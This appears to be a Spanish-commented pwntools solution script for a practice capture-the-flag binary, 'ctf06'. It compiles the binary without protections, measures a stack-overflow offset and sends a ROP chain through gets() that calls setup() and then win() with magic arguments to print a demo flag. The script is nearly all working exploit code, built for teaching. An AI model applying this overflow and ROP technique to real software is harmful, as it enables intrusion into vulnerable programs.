#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-06 - "Protocolo de doble llave": setup() y luego win(a, b).
Diagnóstico: No PIE, NX, gets() única; variable global `sello` solo la
activa setup(0x72756e31); win(0xfeedface, 0xdeadfa11) exige además los
dos sellos. Gadgets embebidos: g_pop_rdi, g_pop_rsi, g_ret.
Razonamiento: UNA línea de gets() debe encadenar DOS llamadas: el ret
de setup() entrega el control a la segunda mitad de la cadena. printf
vive en ambas funciones: cada entrada a función merece su propia
revisión de alineación (la pila entra desalineada al saltar por ret).
USO: python3 sol_ctf06.py"""
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf06'
FLAG_DEMO = 'FLAG{CTF06_doble_llave_encadenada}'
MODO_SETUP = 0x72756e31
SELLO_RDI = 0xfeedface
SELLO_RSI = 0xdeadfa11

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'ctf06.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

elf = ELF(BIN, checksec=False)
g_pop_rdi = elf.symbols['g_pop_rdi']
g_pop_rsi = elf.symbols['g_pop_rsi']
g_ret = elf.symbols['g_ret']
setup = elf.symbols['setup']
win = elf.symbols['win']
log.info('g_pop_rdi = %#x | g_pop_rsi = %#x | g_ret = %#x',
         g_pop_rdi, g_pop_rsi, g_ret)

# ------------------------------------------------------------------
# FASE 1 - offset dinámico (cyclic + corefile, método A2)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'exige DOS llaves')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - control: solo win() con sus sellos -> camara bloqueada
#   (win() se niega si nadie llamo a setup() antes: lo comprobamos)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'exige DOS llaves')
payload = (b'A' * offset
           + p64(g_pop_rdi) + p64(SELLO_RDI)
           + p64(g_pop_rsi) + p64(SELLO_RSI)
           + p64(g_ret) + p64(win))
assert b'\n' not in payload, 'gets() cortaría el payload en 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()
if b'bloqueada' in salida:
    log.info('Control OK: win() sin setup() dice "camara bloqueada". '
             'El orden importa.')

# ------------------------------------------------------------------
# FASE 3 - protocolo completo, casilla a casilla:
#   [g_pop_rdi][0x72756e31]   <- RDI = modo de setup
#   [g_ret]                   <- alineación para el printf de setup
#   [setup]                   <- desbloquea `sello`; su ret sigue
#   [g_pop_rdi][0xfeedface]   <- RDI = sello 1 de win
#   [g_pop_rsi][0xdeadfa11]   <- RSI = sello 2 de win
#   [g_ret]                   <- alineación para el printf de win
#   [win]                     <- cámara abierta, flag a la vista
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'exige DOS llaves')
payload = (b'A' * offset
           + p64(g_pop_rdi) + p64(MODO_SETUP)
           + p64(g_ret)
           + p64(setup)
           + p64(g_pop_rdi) + p64(SELLO_RDI)
           + p64(g_pop_rsi) + p64(SELLO_RSI)
           + p64(g_ret)
           + p64(win))
assert b'\n' not in payload, 'gets() cortaría el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if b'[setup] maquinaria desbloqueada' in salida and (
        b'[win] FLAG:' in salida or FLAG_DEMO.encode() in salida):
    flag = salida[salida.find(b'FLAG:'):].split(b'\n')[0] \
        if b'FLAG:' in salida else FLAG_DEMO.encode()
    log.success('CTF-06 SUPERADO: dos llamadas encadenadas en UNA '
                'cadena; protocolo de doble llave completado (%s).'
                % flag.decode('utf-8', 'replace'))
elif b'[win] FLAG:' in salida or FLAG_DEMO.encode() in salida:
    log.success('CTF-06 SUPERADO: la cadena abrió la cámara (revisa el '
                'eco de setup() en tu salida).')
else:
    log.failure('CTF-06: sin flag. Repasa: setup ANTES de win, modo '
                '0x72756e31, sellos 0xfeedface/0xdeadfa11 y la alineación '
                'de CADA llamada.')
